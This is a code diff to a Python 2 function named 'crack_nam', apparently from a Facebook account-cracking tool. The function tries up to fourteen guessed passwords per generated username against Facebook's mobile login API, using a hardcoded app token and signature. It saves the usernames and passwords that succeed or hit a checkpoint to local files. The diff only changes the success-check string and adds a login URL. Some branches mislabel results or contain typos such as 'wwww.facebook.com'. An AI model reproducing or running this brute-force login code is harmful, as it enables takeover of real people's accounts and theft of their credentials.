@@ -300,6 +300,7 @@ def crack_nam():
 
     xxx = str(len(id))
     jalan('\033[1;96m[+] \x1b[1;93mTotal user name \x1b[1;97m:\x1b[1;97m ' + xxx)
+    login = 'https://www.facebook.com/login.php?login_attempt=1'
     time.sleep(1)
     titik = ['.   ', '..  ', '... ']
     for o in titik:
@@ -323,13 +324,13 @@ def crack_nam():
         try:
             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             w = json.load(data)
-            if 'access_token' in w:
+            if 'mbasic.facebook.com' in w:
                 print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass1
                 okb = open('save/usernam.txt', 'a')
                 okb.write('[OK] ' + c + user + ' | ' + pass1 + '\n')
                 okb.close()
                 oks.append(user + pass1)
-            elif 'www.facebook.com' in w['error_msg']:
+            elif 'wwww.facebook.com' in w['error_msg']:
                 print '\033[1;96m| \033[1;93mCP \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass1
                 cps = open('save/usernam.txt', 'a')
                 cps.write('[CP] ' + c + user + ' | ' + pass1 + '\n')
@@ -338,7 +339,7 @@ def crack_nam():
             else:
                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                 w = json.load(data)
-                if 'access_token' in w:
+                if 'mbasic.facebook.com' in w:
                     print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass2
                     okb = open('save/usernam.txt', 'a')
                     okb.write('[OK] ' + c + user + ' | ' + pass2 + '\n')
@@ -353,7 +354,7 @@ def crack_nam():
                 else:
                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     w = json.load(data)
-                    if 'access_token' in w:
+                    if 'mbasic.facebook.com' in w:
                         print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass3
                         okb = open('save/usernam.txt', 'a')
                         okb.write('[CP] ' + c + user + ' | ' + pass3 + '\n')
@@ -368,7 +369,7 @@ def crack_nam():
                     else:
                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                         w = json.load(data)
-                        if 'access_token' in w:
+                        if 'mbasic.facebook.com' in w:
                             print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass4
                             okb = open('save/usernam.txt', 'a')
                             okb.write('[OK] ' + c + user + ' | ' + pass4 + '\n')
@@ -383,7 +384,7 @@ def crack_nam():
                         else:
                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                             w = json.load(data)
-                            if 'access_token' in w:
+                            if 'mbasic.facebook.com' in w:
                                 print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +   ' | '  +  pass5
                                 okb = open('save/usernam.txt', 'a')
                                 okb.write('[OK]' + c + user + ' | ' + pass5 + '\n')
@@ -398,7 +399,7 @@ def crack_nam():
                             else:
                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                 w = json.load(data)
-                                if 'access_token' in w:
+                                if 'mbasic.facebook.com' in w:
                                     print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +  ' | '  +  pass6
                                     okb = open('save/email.txt', 'a')
                                     okb.write('[OK] ' + c + user + ' | ' + pass6 + '\n')
@@ -413,7 +414,7 @@ def crack_nam():
                                 else:
                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                     w = json.load(data)
-                                    if 'access_token' in w:
+                                    if 'mbasic.facebook.com' in w:
                                         print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;97m ' + c + user +  ' | '  +  pass7
                                         okb = open('save/email.txt', 'a')
                                         okb.write('[OK]' + c + user + ' | ' + pass7 + '\n')
@@ -428,7 +429,7 @@ def crack_nam():
                                     else:
                                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                         w = json.load(data)
-                                        if 'access_token' in w:
+                                        if 'mbasic.facebook.com' in w:
                                             print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;31m ' + m + user +  ' | '  +  pass8
                                             okb = open('save/userid.txt', 'a')
                                             okb.write('[CP] ' + m + user + ' | ' + pass8 + '\n')
@@ -443,7 +444,7 @@ def crack_nam():
                                         else:
                                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                             w = json.load(data)
-                                            if 'access_token' in w:
+                                            if 'mbasic.facebook.com' in w:
                                                 print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;31m ' + m + user +  ' | '  +  pass9
                                                 okb = open('save/userid.txt', 'a')
                                                 okb.write('[OK] ' + m + user + ' | ' + pass9 + '\n')
@@ -458,7 +459,7 @@ def crack_nam():
                                             else:
                                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                 w = json.load(data)
-                                                if 'access_token' in w:
+                                                if 'mbasic.facebook.com' in w:
                                                     print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;31m ' + m + user +  ' | '  +  pass10
                                                     okb = open('save/userid.txt', 'a')
                                                     okb.write('[OK]' + m + user + ' | ' + pass10 + '\n')
@@ -473,7 +474,7 @@ def crack_nam():
                                                 else:
                                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                     w = json.load(data)
-                                                    if 'access_token' in w:
+                                                    if 'mbasic.facebook.com' in w:
                                                         print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;31m ' + m + user +  ' | '  +  pass11
                                                         okb = open('save/userid.txt', 'a')
                                                         okb.write('[CP] ' + m + user + ' | ' + pass11 + '\n')
@@ -488,7 +489,7 @@ def crack_nam():
                                                     else:
                                                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                         w = json.load(data)
-                                                        if 'access_token' in w:
+                                                        if 'mbasic.facebook.com' in w:
                                                             print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;31m ' + m + user +  ' | '  +  pass12
                                                             okb = open('save/userid.txt', 'a')
                                                             okb.write('[OK] ' + m + user + ' | ' + pass12 + '\n')
@@ -503,7 +504,7 @@ def crack_nam():
                                                         else:
                                                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                             w = json.load(data)
-                                                            if 'access_token' in w:
+                                                            if 'mbasic.facebook.com' in w:
                                                                 print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;31m ' + m + user +  ' | '  +  pass13
                                                                 okb = open('save/userid.txt', 'a')
                                                                 okb.write('[OK]' + m + user + ' | ' + pass13 + '\n')
@@ -518,7 +519,7 @@ def crack_nam():
                                                             else:
                                                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + m + user + '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                 w = json.load(data)
-                                                                if 'access_token' in w:
+                                                                if 'mbasic.facebook.com' in w:
                                                                     print '\033[1;96m| \033[1;34mOK \033[1;96m|\033[1;31m ' + m + user +  ' | '  +  pass14
                                                                     okb = open('save/userid.txt', 'a')
                                                                     okb.write('[OK]' + m + user + ' | ' + pass14 + '\n')
